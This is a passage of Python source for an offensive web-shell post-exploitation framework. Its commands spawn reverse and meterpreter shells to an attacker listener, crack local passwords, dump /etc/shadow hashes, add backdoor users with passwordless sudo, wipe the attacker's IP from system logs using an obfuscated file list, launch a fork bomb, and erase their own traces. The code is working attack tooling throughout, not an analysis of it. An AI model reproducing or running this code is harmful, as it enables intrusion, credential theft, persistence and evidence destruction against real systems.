		sys.stdout.write("  Removing payloads.............................................")
		for payload in _gs["payloads"].keys():
			if not payload == "smplshll":
				PHPInteractor.command("rm " + _gs["initial_path"] + "/" + _gs["payloads"][payload]["path"])
		print("[\033[92mOK\033[0m]")
		
		## Remove self
		sys.stdout.write("  Removing initial shell........................................")
		PHPInteractor.command("rm " + _gs["initial_path"] + "/" + _gs["payloads"]["smplshll"]["path"])
		print("[\033[92mOK\033[0m]")
		
		## Shutting down
		print("  Shutting down...")
		sys.exit()

	@staticmethod
	def mc_exit(match):
		
		if Print.confirm("Run 'Kill Self Protocol'"): MandoCommand.mc_kill_self(match)
		sys.exit

	@staticmethod
	def definition():
		if not hasattr(MandoCommand, "command_definition"):
			MandoCommand.command_definition = {
				"php_var": {
					"description"	: "Prints the php variables",
					"validation"	: "php_var",
					"help"			: "",
					"run"			: MandoCommand.mc_php_variables,
					"platform"		: [Utility.os.LINUX],
				},
				"php_eval": {
					"description"	: "Evaluats php code",
					"validation"	: "php_eval",
					"help"			: "",
					"run"			: MandoCommand.mc_php_eval,
					"platform"		: [Utility.os.LINUX],
				},
				"shell": {
					"description"	: "Spawns a reverse shell and interacts with it",
					"validation"	: r"shell\s+((25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)(\.(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)){3})",
					"help"			: "shell <ip>",
					"run"			: MandoCommand.mc_shell,
					"platform"		: [Utility.os.LINUX],
				},			
				"meterpreter": {
					"description"	: "Injects a meterpreter shell",
					"validation"	: r"meterpreter\s+((25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)(\.(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)){3})\:(\d+)",
					"help"			: "syntax: \033[94mmeterpreter <ip>:<port>\033[0m\npayload: \033[94mphp/meterpreter/reverse_tcp\033[0m",
					"run"			: MandoCommand.mc_meterpreter,
					"platform"		: [Utility.os.LINUX, Utility.os.WINDOWS],
				},
				"upload": {
					"description"	: "Uploads a file",
					"validation"	: "upload",
					"help"			: "upload <path>",
					"run"			: MandoCommand.mc_file_upload,
					"platform"		: [Utility.os.LINUX],
				},
				"download": {
					"description"	: "Downloads a file",
					"validation"	: r"download\s+([^\s]+)",
					"help"			: "download <path>",
					"run"			: MandoCommand.mc_file_download,
					"platform"		: [Utility.os.LINUX],
				},
				"dir_dump": {
					"description"	: "Downloads the current directory content",
					"validation"	: "dir_dump",
					"help"			: "",
					"run"			: MandoCommand.mc_dir_dump,
					"platform"		: [Utility.os.LINUX],
				},
				"kill_self": {
					"description"	: "Cleans up traces and aborts the shell",
					"validation"	: "kill_self",
					"help"			: "",
					"run"			: MandoCommand.mc_kill_self,
					"platform"		: [Utility.os.LINUX],
				},
				"exit": {
					"description"	: "Exits the shell",
					"validation"	: "exit",
					"help"			: "",
					"run"			: MandoCommand.mc_exit,
					"platform"		: [Utility.os.LINUX, Utility.os.WINDOWS],
				},
				"status": {
					"description"	: "Shows shell status",
					"validation"	: "status",
					"help"			: "",
					"run"			: MandoCommand.mc_status,
					"platform"		: [Utility.os.LINUX, Utility.os.WINDOWS],
				},
				"sudo": {
					"description"	: "Run a command as sudo",
					"validation"	: r"sudo\s+(.+)",
					"help"			: "",
					"run"			: MandoCommand.mc_sudo,
					"platform"		: [Utility.os.LINUX],
				},
				"sessions": {
					"description"	: "Checks open sessions",
					"validation"	: "sessions",
					"help"			: "",
					"run"			: MandoCommand.mc_sessions,
					"platform"		: [Utility.os.LINUX],
				},
				"interact": {
					"description"	: "Interacts with specified session id",
					"validation"	: r"interact\s+(\d+)",
					"help"			: "interact <session-id>",
					"run"			: MandoCommand.mc_interact,
					"platform"		: [Utility.os.LINUX],
				},
				
				### TODO :: 
				# attack/su_crack [using PHPInteractor.sudo_command_prompt("su -c whoami USERNAME", "PASSWORD", False)]
				# attack/www_to_root [tries different attacks to 'automatically' elevate www-data to root or/sudo]
				
				
	#				attack/su_crack [using PHPInteractor.sudo_command_prompt("su -c whoami USERNAME", "PASSWORD", False)]
	#				attack/www_to_root [tries different attacks to 'automatically' elevate www-data to root or/sudo]
	#					: https://blog.sucuri.net/2013/07/from-a-site-compromise-to-full-root-access-bad-server-management-part-iii.html
				
				"gather/network_info": {
					"description"	: "Gathers network information",
					"validation"	: "gather\/network_info",
					"help"			: "",
					"run"			: MandoCommand.mc_gather_network_info,
					"platform"		: [Utility.os.LINUX],
				},
				"gather/user_history": {
					"description"	: "Gathers user history",
					"validation"	: "gather\/user_history",
					"help"			: "",
					"run"			: MandoCommand.mc_gather_user_history,
					"platform"		: [Utility.os.LINUX],
				},
				"gather/system_info": {
					"description"	: "Gathers system information",
					"validation"	: "gather\/system_info",
					"help"			: "",
					"run"			: MandoCommand.mc_gather_system_info,
					"platform"		: [Utility.os.LINUX],
				},
				"gather/configs": {
					"description"	: "Gathers system configurations",
					"validation"	: "gather\/configs",
					"help"			: "",
					"run"			: MandoCommand.mc_gather_configs,
					"platform"		: [Utility.os.LINUX],
				},
				"core/pwd": {
					"description"	: "Print working directory",
					"validation"	: "core/pwd",
					"help"			: "",
					"run"			: MandoCommand.mc_pwd,
					"platform"		: [Utility.os.LINUX, Utility.os.WINDOWS],
				},
				"core/ls": {
					"description"	: "List directory content",
					"validation"	: "core/ls",
					"help"			: "",
					"run"			: MandoCommand.mc_ls,
					"platform"		: [Utility.os.LINUX, Utility.os.WINDOWS],
				},
				"?": {
					"description"	: "Shows command help",
					"validation"	: r"\?(\s+([^\s]+))?",
					"help"			: "? <command>",
					"run"			: None,
					"platform"		: [Utility.os.LINUX, Utility.os.WINDOWS],
				}
			}
		return MandoCommand.command_definition
		
	@staticmethod
	def commands():
		return [key for key in MandoCommand.definition().keys() if _gs["system"] in MandoCommand.definition()[key]["platform"]]

	@staticmethod
	def get(key):
		return MandoCommand.definition()[key]
	
	@staticmethod
	def command(x):			
		if (not x == None):
			command_name = x.split(" ")[0]
			function = MandoCommand.get(command_name) if command_name in MandoCommand.commands() else None

			if function != None:
				if hasattr(function["run"], "__call__") and re.compile(function["validation"]).match(x):
					function["run"](re.compile(function["validation"]).match(x))
				else:
					Print.text()
					match = re.compile(function["validation"]).match(x)
						
					if match and match.group(1) != None and match.group(1).strip() in MandoCommand.commands():
						for x in MandoCommand.get(match.group(1).strip())["help"].split("\n"): Print.text(x)
					else:
						Print.table(
							caption = "CORE COMMANDS", 
							headers = ["Command", "Description"], 
							rows = list([{ 
								0 : cmd, 
								1 : MandoCommand.get(cmd)["description"],
							} for cmd in sorted(MandoCommand.commands())])
						)
					Print.text()
				return True
			else:
				return False
	
class SessionManager(object):
	global _gs
	
	nextID = 0	
		
	@staticmethod
	def init():
		if not "_sessions" in _gs.keys(): 
			_gs["_sessions"] = {}	
		
	@staticmethod
	def register(record, name):
		SessionManager.init()
		
		record.id = SessionManager.nextID
		SessionManager.nextID += 1
		
		_gs["_sessions"][record.id] = { "name" : name, "record" : record }
		
		return _gs["_sessions"][record.id]["record"]
		
	@staticmethod
	def unregister(id):
		SessionManager.init()
		
		if id in _gs["_sessions"].keys():
			session = _gs["_sessions"][id]["record"]

			while len(session.pids) > 0:
				pid = str(session.pids.pop(0))
				Print.status("Killing process " + pid)
				PHPInteractor.command("kill " + pid)	
		
			del _gs["_sessions"][id]
	
	@staticmethod
	def select(id = None):
		SessionManager.init()
		
		if id != None and id in _gs["_sessions"].keys():
			return _gs["_sessions"][id]["record"]
		else:
			Print.table(
				caption = "SESSIONS", 
				headers = ["id", "name", "user", "connection"], 
				rows = list([{ 
					0:id, 
					1:_gs["_sessions"][id]["name"], 
					2:_gs["_sessions"][id]["record"].whoami() if hasattr(_gs["_sessions"][id]["record"], "whoami") else "",
					3:_gs["_sessions"][id]["record"].connection_info if hasattr(_gs["_sessions"][id]["record"], "connection_info") else "",
				} for id in _gs["_sessions"].keys()])
			)
		
class Shell(object):
	global _gs
	
	def __init__(self, lhost, lport):
		self.system = Utility.os.UNDEFINED
		self.interact_state = enum(UNDEFINED = 0, CONTINUE = 1, BREAK = 2)
		self.rc_password = "".join(random.SystemRandom().choice(string.ascii_uppercase + string.ascii_lowercase + string.digits) for x in range(8))
		self.id = -1
		self.pids = []
		self.option_values = {}
		self.selected_command = None
		self.tty = False
		self.connection_info = "no connection"
		self.lhost = lhost
		self.lport = lport
	
	def send(self, input = None):
		
		if self.connection != None:		
			if input != None:
				counter = 0
				fcntl.fcntl(self.connection, fcntl.F_SETFL, os.O_NONBLOCK)
				self.connection.send((input + "\r").encode("utf-8"))
				#time.sleep(0.5)
								
				while True:
					try:
						result = self.connection.recv(16834).decode("utf-8").split("\n")
					except socket.error as e:
						err = e.args[0]
						if err == errno.EAGAIN or err == errno.EWOULDBLOCK:
							if counter == 10:
								Print.error("No response, aborting")
								return ""
							time.sleep(0.2)
							counter += 1
							continue
						else:
							print(e)
							sys.exit(1)
					else:
						break

				return "\n".join(result[1:-1]).strip()
			else:
				self.connection.send("\r")
				time.sleep(1)
				self.connection.recv(16834)
		else:
			Print.error("Connection is closed")
			return ""
		
	def open(self):	
		def bind(retries = 5):
			try:
				self.socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
				self.socket.bind((self.lhost, self.lport))
				self.socket.listen(1)
				Print.success("Socket listening on port {0}".format(self.socket.getsockname()[1]))

			except socket.error as err:
				Print.error("Socket binding error: " + str(err[0]))

				if retries > 0:
					Print.status("Retrying {0}...".format(retries))
					return socketBind(retries - 1)

				return None
			
		def accept():
			if self.socket == None: return
			try:
				self.connection, self.address = self.socket.accept()
				time.sleep(0.2)				# Wait
				self.connection.recv(16834)	# Clear buffer
				self.connection_info = "{0}:{1} -> {2}:{3}".format(self.address[0], self.address[1], self.socket.getsockname()[0], self.socket.getsockname()[1])
				Print.success("Session opened from {0}:{1} to {2}:{3}".format(self.address[0], self.address[1], self.socket.getsockname()[0], self.socket.getsockname()[1]))

			except socket.error as err:
				Print.error("Socket accepting error: " + str(err[0]))
				
		def sendPayload(shell, lhost, lport):
			#if not "session_injections" in _gs.keys(): 
			#	_gs["session_injections"] = []
			time.sleep(1)
			for payload in _gs["reverse_shells"]:
				pid = PHPInteractor.command(payload.format(lhost, lport) + " & echo $!").strip()
				if PHPInteractor.command("ps --pid " + pid + " -o comm=") != "":
					shell.pids.append(int(pid))
					break
		
		def spawnTTY():
			spawners = [
				"python -c 'import pty; pty.spawn(\"/bin/sh\")'",
				"/bin/sh -i",
				"perl -e 'exec \"/bin/sh\";'",
				##"perl: exec \"/bin/sh\";",
				##"ruby: exec \"/bin/sh\"",
				##"lua: os.execute('/bin/sh')"
			]

			Print.status("Trying to spawn tty")
			for spawner in spawners:
				
				''' ## TODO :: FIND A WAY TO GET PID
				## Try to spawn tty
				result = send(connection, spawner + " & echo $? $!").strip().split(" ")
				
				## Check for success
				if len(result) == 2 and result[0] == "0":
					_gs["session_injections"].append(int(result[1]))
					Print.success("Successfully spawned tty"				
					return True
				'''
				
				## Try to spawn tty
				self.send(spawner)
				
				## Check for success
				if (self.send("echo $?") == "0"):
					Print.success("Successfully spawned tty")			
					self.tty = True
					return
				
			Print.error("Failed to spawn any tty")
			self.tty = False
			
		try:
			bind()
			threading.Thread(target = sendPayload, args = (self, self.lhost, self.socket.getsockname()[1])).start()
			accept()
			spawnTTY()
			Print.text()
		except:
			test = "do_something"
			
	def whoami(self):
		return self.send("whoami")
		
	def interact(self):
		
		self.system = Utility.get_os(self.send)
		
		class RunCommands(object):
			
			@staticmethod
			def rc_external_shell(command):

				# ADD PAYLOADS AS FOR METERPRETER
				# >> TODO:: SOCAT INJECTION:
				# LISTENER			socat -,raw,echo=0 tcp-listen:4545
				# PAYLOAD			./socat tcp:10.0.2.238:4545 exec:"bash -li",pty,stderr,setsid,sigint,sane
		
				valid, local_options = RunCommands.validate(command)

				if valid:
					for payload in _gs["reverse_shells"]:
						pid = self.send(payload.format(local_options["LHOST"], local_options["LPORT"]) + " & echo $!").strip()
						
						if self.send("ps --pid " + pid + " -o comm=").split("\n")[0].strip() != "":
							Print.success("Successfully spawned reverse shell")
							return
					Print.error("Failed to spawn reverse shell")			
			
			@staticmethod
			def rc_external_meterpreter(command):

				_payloads = {
					"php/meterpreter/reverse_tcp": "9f8cff7e21c4...",
					"linux/x86/meterpreter/reverse_tcp": "9f8cff7e21c4...",
					"python/meterpreter/reverse_tcp": "707974686f6e202d6320276578656328223639364437303646373237343230373336463633364236353734324337333734373237353633373430413733334437333646363336423635373432453733364636333642363537343238333232433733364636333642363537343245353334463433344235463533353435323435343134443239304137333245363336463645364536353633373432383238323733313330324533303245333232453332333333383237324333343334333433343239323930413643334437333734373237353633373432453735364537303631363336423238323733453439323732433733324537323635363337363238333432393239354233303544304136343344373332453732363536333736323836433239304137373638363936433635323036433635364532383634323933433643334130413039363432423344373332453732363536333736323836433244364336353645323836343239323930413635373836353633323836343243374232373733323733413733374432393041222e6465636f6465282268657822292e7265706c61636528225f5f4c484f53545f5f222c2022{0}22292e7265706c61636528225f5f4c504f52545f5f222c2022{1}22292927"
				}

				valid, local_options = validate_rc(command)

				if valid:
					try:
						payload = _payloads[local_options["PAYLOAD"]].format(local_options["LHOST"].encode("hex"), local_options["LPORT"].encode("hex")).decode("hex")
	
						pid = self.send(payload + " & echo $!")
						pid = int(str(pid.split("\n")[1]).strip()) + 1
						
						if self.send("ps --pid " + str(pid) + " -o comm=").split("\n")[0].strip() != "":
							Print.success("Successfully spawned meterpreter shell")
						else:
							Print.error("Failed to spawn meterpreter shell")
					except:
						Print.success("Could not determine status of execution")
			
			@staticmethod					
			def rc_run_as(command):
				
				valid, local_options = validate_rc(command)
				
				if valid:
					if not self.tty:
						Print.error("This command needs tty")
					else:			
						Print.status("Trying to spawn " + local_options["USERNAME"])

						self.send("su " + local_options["USERNAME"])
						self.send(local_options["PASSWORD"])
						self.send("")
						
						if self.send("whoami") == local_options["USERNAME"]:
							Print.success("Successfully spawned " + local_options["USERNAME"])
						else:
							self.send("su " + local_options["USERNAME"])
							self.send("")
							
							if self.send("whoami") == local_options["USERNAME"]:
								Print.success("Successfully spawned " + local_options["USERNAME"] + " \033[94mwithout password\033[0m")
							else:
								Print.error("Failed to spawn " + local_options["USERNAME"])
			
			@staticmethod
			def rc_cred_root(command):
				
				valid, local_options = validate_rc(command)
				
				if valid:
					if not self.tty:
						Print.error("This command needs tty")
					else:			
						Print.status("Trying to spawn " + local_options["USERNAME"])
						
						self.send("su " + local_options["USERNAME"])
						self.send(local_options["PASSWORD"])
						self.send("")
						
						if self.send("whoami") == local_options["USERNAME"]:
							Print.success("Successfully spawned " + local_options["USERNAME"])
							Print.status("Trying to spawn root")
							self.send("sudo -i")
							self.send(local_options["PASSWORD"])
							self.send("")
						else:
							Print.error("Failed to spawn " + local_options["USERNAME"])

						if self.send("whoami") == "root":
							Print.success("Successfully spawned root")
						else:
							Print.error("Failed to spawn root")
			
			@staticmethod
			def rc_create_user(command, sudo = False):
				
				valid, local_options = validate_rc(command)
				
				if valid:
					if not self.tty:
						Print.error("This command needs tty")
					else:			
						Print.status("Trying to create user " + local_options["USERNAME"])
						
						self.send(("sudo " if sudo else "") + "useradd " + local_options["USERNAME"])
						self.send(("sudo " if sudo else "") + "passwd " + local_options["USERNAME"])
						self.send(local_options["PASSWORD"])
						self.send(local_options["PASSWORD"])
						self.send("")
						
						if self.send("grep -c '^" + local_options["USERNAME"] + ":' /etc/passwd").strip() == "1":
							Print.success("Successfully created " + local_options["USERNAME"])
							Print.status("Trying add " + local_options["USERNAME"] + " to sudo")
							self.send(("sudo " if sudo else "") + "adduser " + local_options["USERNAME"] + " sudo")
							self.send(("sudo " if sudo else "") + "echo '" + local_options["USERNAME"] + " ALL=(ALL) NOPASSWD: ALL' >> /etc/sudoers")							

							if self.send("sudo -u " + local_options["USERNAME"] + " whoami").strip() == local_options["USERNAME"]:
								Print.success("Successfully created sudo user " + local_options["USERNAME"])
							else:
								Print.error("Failed to created sudo user " + local_options["USERNAME"])
						else:
							if not sudo:
								Print.status("Trying with sudo")
								RunCommands.rc_create_user(command, True)
							else:
								Print.error("Failed to create user " + local_options["USERNAME"])
			
			@staticmethod
			def rc_enable_sudo(command):
				
				valid, local_options = validate_rc(command)
				
				if valid:
					if not self.tty:
						Print.error("This command needs tty")
					else:
						if self.send("grep -c '^" + local_options["USERNAME"] + ":' /etc/passwd").strip() == "1":
							
							Print.status("Trying add " + local_options["USERNAME"] + " to sudo")
							sudo = (True if self.send("whoami") != "root" else False)
							self.send(("sudo " if sudo else "") + "adduser " + local_options["USERNAME"] + " sudo")
							self.send(("sudo " if sudo else "") + "echo '" + local_options["USERNAME"] + " ALL=(ALL) NOPASSWD: ALL' >> /etc/sudoers")							

							if self.send("sudo -u " + local_options["USERNAME"] + " whoami").strip() == local_options["USERNAME"]:
								Print.success("Successfully enabled sudo for user " + local_options["USERNAME"])
							else:
								Print.error("Failed to enable sudo for user " + local_options["USERNAME"])
						else:
							Print.error("User '" + local_options["USERNAME"] + "' does not exist")
			
			@staticmethod
			def rc_log_cleaner(command):

				valid, local_options =  validate_rc(command)

				if valid:
					target = local_options["TARGET"]
					replacement = (".".join([str(random.randint(1,254)) for x in range(4)]) if re.match(r"^((25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)(\.(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)){3})$", target) else "".join(random.choice("abcdefghijklmnopqrstuvwxyz-ABCDEFGHIJKLMNOPQRSTUVWXYZ-0123456789") for x in range(8)) + random.choice([".aero",".arpa",".asia",".biz",".cat",".com",".coop",".edu",".eu",".gov",".info",".int",".jobs",".mil",".mobi",".museum",".name",".net",".org",".post",".pro",".tel",".travel",".xxx",".ac",".ad",".ae",".af",".ag",".ai",".al",".am",".an",".ao",".aq",".ar",".as",".at",".au",".aw",".ax",".az",".ba",".bb",".bd",".be",".bf",".bg",".bh",".bi",".bj",".bm",".bn",".bo",".br",".bs",".bt",".bv",".bw",".by",".bz",".ca",".cc",".cd",".cf",".cg",".ch",".ci",".ck",".cl",".cm",".cn",".co",".cr",".cs",".cu",".cv",".cx",".cy",".cz",".dd",".de",".dj",".dk",".dm",".do",".dz",".ec",".ee",".eg",".eh",".er",".es",".et",".eu",".fi",".fj",".fk",".fm",".fo",".fr",".ga",".gb",".gd",".ge",".gf",".gg",".gh",".gi",".gl",".gm",".gn",".gp",".gq",".gr",".gs",".gt",".gu",".gw",".gy",".hk",".hm",".hn",".hr",".ht",".hu",".id",".ie",".il",".im",".in",".io",".iq",".ir",".is",".it",".je",".jm",".jo",".jp",".ke",".kg",".kh",".ki",".km",".kn",".kp",".kr",".kw",".ky",".kz",".la",".lb",".lc",".li",".lk",".lr",".ls",".lt",".lu",".lv",".ly",".ma",".mc",".md",".me",".mg",".mh",".mk",".ml",".mm",".mn",".mo",".mp",".mq",".mr",".ms",".mt",".mu",".mv",".mw",".mx",".my",".mz",".na",".nc",".ne",".nf",".ng",".ni",".nl",".no",".np",".nr",".nu",".nz",".om",".pa",".pe",".pf",".pg",".ph",".pk",".pl",".pm",".pn",".pr",".ps",".pt",".pw",".py",".qa",".re",".ro",".rs",".ru",".rw",".sa",".sb",".sc",".sd",".se",".sg",".sh",".si",".sj",".sk",".sl",".sm",".sn",".so",".sr",".st",".su",".sv",".sy",".sz",".tc",".td",".tf",".tg",".th",".tj",".tk",".tl",".tm",".tn",".to",".tp",".tr",".tt",".tv",".tw",".tz",".ua",".ug",".uk",".um",".us",".uy",".uz",".va",".vc",".ve",".vg",".vi",".vn",".vu",".wf",".ws",".ye",".yt",".yu",".za",".zm",".zr",".zw"]))
					files = zlib.decompress(base64.b64decode("eNrtWsmO3DYQvQfIp1gydc0H5BLEBnxxTgO1xF4AqdUmpWnN34daySpWFWcS25kAfbGb9Wp9JVIiOflzafKybvOhb2+/5YMNR7qv1l+TVtOdgpEZrsHI20Bs8hfj0+gO4t33eHcQ707YbBHuUYR7lM8IS1qHW36jL3GENY6wkDGuZIRpjbCW0RczwmpGWEBshwsKAjWl7Z0fb7ILpmD7YAvHq28kAEEUZRPcyqrq12FVdcO1D0VTJDgK9Z05HBHOFsmWJPJldDPUOgOFrcIYnAO8BiRdz8VTwKW2PCC6DBS8kM2QdXXuWk5K5jYjsrcoM2DziuhTv5quKptX9erD2DZiE6EC0UhegQ2DGgpBRFwMJt0HShAQMxfdYqoRwubMNZywl23fkBH7AMS9tmV7KKdfmW0PNSW/AnmsGes4nPK4ShfdOXkcHAkpTVabtbCsiaVyv3amX/7NykabHkFYOPUtAnahAIVCQnfJVJRHOe0PBGdHWzDZQmyT+kdLgPaaYogIFD+toq2gsE1CBn4NRHe5dO/Gsy7ycqgv/ROYQAukeChEZk43Z7MKiSkBI6Fz399YoMbIlt9sxcjrEJh4okJs8poCFmI5M48KxnTFGC9SCooi4H6/U2Iq301OEknn6JGCh6K8TNf1eXYo7fnpfLF9Z142GRqGCkjfqwIt97mKNWdRJNhH4TOHLAHEApRUCa4U60vRzgrBWcE6K7CzpbWUqxXh5FB45LwcaSdH6CNaaqpKW0stKCGWKREtYlQb0xna7Q5RXj1IOLW2eZIShjjlHmkwMYTkJ9job4O2Pa0ggALZItci1TzTEtESzwmaZYZSBEn8KIEgxdepEgkrOWOVSlnFOe+rOgq6yVGwTUzlGWKCGZtCBHAzm5mZ0twS5oQ4H8i5ANbGMBIAgjBAjtOLQMmQzyOmVR/ozq5y3KJVTHY2wAQzNgWGVqaxdF+FtvJdlZrK9pRrKdNRqaFCP8V2cowphjJFc6YE0hTPmpJoUyxviiNOMcwpiTolcKdE8lCG82FcnEcoxmlgTDBjQ0UA/MBGLiFI5RNrJF0kUmBSL2iWCoGlgmepkFgqZJYKiaUiyVKRYqlIs1RwLNEkCRzxFEkMyQRJ/CTpSbGTJodLbt0Ok7EXjM9twcm0vGkCjheGOKNATC5CUR7IAC+cdZt/+evLH59+92M7AHigbnTo6x76rsTVqs21bPVStb11XZM38+Y70HXjW/3BpWdXci6HvDLdNcdHyZcrezPihjVIaMJcPZTd14+tPVk/rozb0OXPbdUZjaXD9TKyESEFMP43qIqYdb6nTkWyg9v6A6HnwV8HTr+srgZz6V/gJdQuPZaXRtdz6SH1rXvKBjdNXiwI0roHqTxpG7I35RsJ2Hqeu6aGJ//i4yE+WPMXoL3dbugUO0h6Gn/+9BnuF4b+HAlUxj0xy1No3f/WrQs1Fv6pkd46Q1dK4ONpy2P+BEa39RSTKvlH3OR+xxvbf3sRm75uTd2vkjeo//H96ONG9HH7+INvH/8HN3rv7QbtVddRYmbf69bnzfct7/V+4nFG/TijfpxRP86of/4Z9eME+K0nwO/5lHWdIvvH2PoOD7ahi6R1O1U/oXSrzQl9RX7tzCn7mCVuz2eZ0+mGnv7zAkuL8RvUYgG1TfN6sET/J7TxH+9G2xu8oYW78OCjgVi4QiQjEGIxC4DsH77pM/51nclvcmqHOnMwHVhoPx6P2kSbeOi7uZzWD6H1R0YkECvhCmBD18XScgu2jRjYAXpNtjwt6bd8Jr6saQTavAxttp8K7d+NsDwSIq2C0BQy2fz6y9/ITFLe")).split(";")

					last_step = 0
					counter = 0;
					progress_length = 64
					
					os.system("setterm -cursor off")
					
					for file in files:
						
						counter += 1
						output = "  " + str(counter) + " of " + str(len(files))
						
						sys.stdout.write("\b" * last_step)
						sys.stdout.write(output)
						sys.stdout.flush()
						
						last_step = len(output)
						
						if self.send("[ -f " + file + " ] && echo 'found' || echo 'not found'") == "found":
							if self.send("[ -w " + file + " ] && echo 'granted' || 'denied'") == "granted":
								if self.send("grep -Fq '" + target + "' " + file + " && echo 'ok'") == "ok":
									
									sys.stdout.write("\b" * last_step)
									sys.stdout.flush()
									last_step = 0
									
									Print.info("Found target in file " + file)
									self.send("sed -ie 's/" + target + "/" + replacement + "/g' " + file)

									if self.send("grep -Fq '" + target + "' " + file + " && echo 'ok'") == "ok":
										tmp = "/tmp/" + "".join(random.SystemRandom().choice(string.ascii_uppercase + string.ascii_lowercase) for x in range(8))
										self.send("sed -e 's/" + target + "/" + replacement + "/g' " + file + " > " + tmp + "; mv -f " + tmp + " " + file)

									if self.send("grep -Fq '" + target + "' " + file + " && echo 'ok'") != "ok":
										Print.success(file + " is clean")
									else:
										Print.error("Failed to clean " + file)

							else:								
								sys.stdout.write("\b" * last_step)
								sys.stdout.flush()
								last_step = 0
									
								Print.error("Couldn't access " + file)
					
					sys.stdout.write("\b" * last_step)
					sys.stdout.flush()
					last_step = 0
					
					os.system("setterm -cursor on")
					Print.success("Scan complete!")
			
			@staticmethod
			def rc_cred_crack(command):
				
				valid, local_options = validate_rc(command)
				
				if valid:
					if not self.tty:
						Print.error("This command needs tty")
					else:
						Print.status("Gathering users")
						users = sorted(self.send("/bin/cat /etc/passwd | cut -d : -f 1").strip().split("\n"))
						
						Print.info("Found " + str(len(users)) + " users:")
						for i in range(0, len(users)):
							Print.text("[" + str(i) + "] " + users[i])
						
						selection = input("  User(s), separate index with comma: ")
						
						passwords = [
							lambda x: x,
							lambda x: x[::-1],
							"password",
							"pass",
							"123"
						]
												
						for userIndex in selection.strip().split(","):
							if re.match(r"[-+]?\d+$", userIndex) is not None:
								index = int(userIndex)
								if index >= 0 and index < len(users):
									user = users[index].strip()
									Print.status("Cracking user '" + user + "'")
									
									for _password in passwords:
										password = (_password(user) if hasattr(_password, "__call__") else _password).strip()
										
										self.send("su -c whoami " + user)					
										if user in self.send(password).strip().split("\n"):
											Print.success("Found credentials " + user + ":" + password)
											break
			
			@staticmethod
			def rc_hash_dump(command):
				
				valid, local_options = validate_rc(command)
				
				if valid:
					if not self.tty:
						Print.error("This command needs tty")
					else:
						sudo = (True if self.send("whoami") != "root" else False)
						
						if ((sudo and self.send("sudo -u root whoami") == "root") or (not sudo)):
							dump = ""
							
							Print.status("Trying to read /etc/passwd")
							passwd = self.send((("sudo " if sudo else "") + "cat /etc/passwd")).split("\n")
							
							Print.status("Trying to read /etc/shadow")
							shadow = self.send((("sudo " if sudo else "") + "cat /etc/shadow")).split("\n")
								
							for shadow_line in shadow:
								match = re.compile(r"(^\w*):([^:]*)").match(shadow_line)
								if match:
									username = match.group(1)
									password = match.group(2)
									if not re.compile(r"^\*|^!$").match(password):
										for passwd_line in passwd:
											if re.compile(r"^" + username + ":").match(passwd_line):
												dump += passwd_line.replace(":x:", ":" + password + ":") + "\n"
												
							if len(dump.split("\n")) > 1:
								Print.success("Successfully dumped hashes")
								Utility.save_loot("unshadowed", "\n".join(dump.split("\n")[:-1]))
							
						else:
							Print.error("Failed to impersonate root")
							Print.info("This command needs root privilage")
			
			@staticmethod
			def rc_forkbomb(command):

				valid, local_options =  validate_rc(command)

				if valid and local_options["RC_PASSWORD"] == self.rc_password:		
					try:
						for i in range(0, 5):
							self.send("f(){ f|f& };f")
							time.sleep(1)

							if self.send("echo online") == "online":
								Print.status("Online... " + str(5 - i))
							else:
								Print.success("System is unresponsive!")
								return
						Print.error("Forkbomb seem to have failed!")
					except:
						Print.status("Could not determine status of execution")
						##Print.success("System is unresponsive!"
						## Next the session will be terminated due to connection failure
				else:
					Print.info("The Run Command password is '" + self.rc_password + "'")
					
			@staticmethod
			def definition():
				if not hasattr(RunCommands, "command_definition"):
					RunCommands.command_definition = {
						"external/shell" : {
							"name"					: "External Shell Injection",
							"description"			: "Injects a reverse shell payload for an external listener. Remember to initialize an open listener for the shell 'netcat -lvp <lport>'.",
							"options" : {
								"LHOST" : {
									"required" 		: True,
									"description"	: "The local host of the listener",
									"validation"	: "\S+"
								},
								"LPORT": {
									"required" 		: True,
									"description" 	: "The local port of the listener",
									"validation" 	: "\d+"
								},
								"PAYLOAD": {
									"required" 		: True,
									"description" 	: "The type of shell payload to inject",
									"list" 			: [
														"netcat", 
														"socat"
													]
								},
							},
							"run"					: RunCommands.rc_external_shell
						},
						"external/meterpreter" : {
							"name"					: "External Meterpreter Injection",
							"description"			: "Injects a meterpreter payload for an external listener. Remember to initialize an open listener for the correct payload you are using.",
							"options" : {
								"LHOST" : {
									"required" 		: True,
									"description"	: "The local host of the listener",
									"validation"	: "\S+"
								},
								"LPORT": {
									"required" 		: True,
									"description" 	: "The local port of the listener",
									"validation" 	: "\d+"
								},
								"PAYLOAD": {
									"required" 		: True,
									"description" 	: "The type of meterpreter payload to inject",
									"list" 			: [
														"php/meterpreter/reverse_tcp", 
														"linux/x86/meterpreter/reverse_tcp",
														"python/meterpreter/reverse_tcp"
													]
								},
							},
							"run"					: RunCommands.rc_external_meterpreter
						},
						"run_as" : {
							"name"					: "Run As",
							"description"			: "Tries to spawn a shell from given credentials.",
							"options" : {
								"USERNAME" : {
									"required" 		: True,
									"description"	: "Username of credentials",
									"validation"	: "\S+"
								},
								"PASSWORD": {
									"required" 		: True,
									"description" 	: "Password of credentials",
									"validation"	: "\S+"
								},
							},
							"run"					: RunCommands.rc_run_as
						},
						"cred_root" : {
							"name"					: "Credential To Root",
							"description"			: "Tries to spawn a root shell from given credentials.",
							"options" : {
								"USERNAME" : {
									"required" 		: True,
									"description"	: "Username of credentials",
									"validation"	: "\S+"
								},
								"PASSWORD": {
									"required" 		: True,
									"description" 	: "Password of credentials",
									"validation"	: "\S+"
								},
							},
							"run"					: RunCommands.rc_cred_root
						},
						"create_user" : {
							"name"					: "Create User",
							"description"			: "Tries to create a user and add it to sudoers.",
							"options" : {
								"USERNAME" : {
									"required" 		: True,
									"description"	: "Username of credentials",
									"validation"	: "\S+"
								},
								"PASSWORD": {
									"required" 		: True,
									"description" 	: "Password of credentials",
									"validation"	: "\S+"
								},
							},
							"run"					: RunCommands.rc_create_user
						},
						"enable_sudo" : {
							"name"					: "Enable Sudo",
							"description"			: "Tries to add user to sudoers by given username.",
							"options" : {
								"USERNAME" : {
									"required" 		: True,
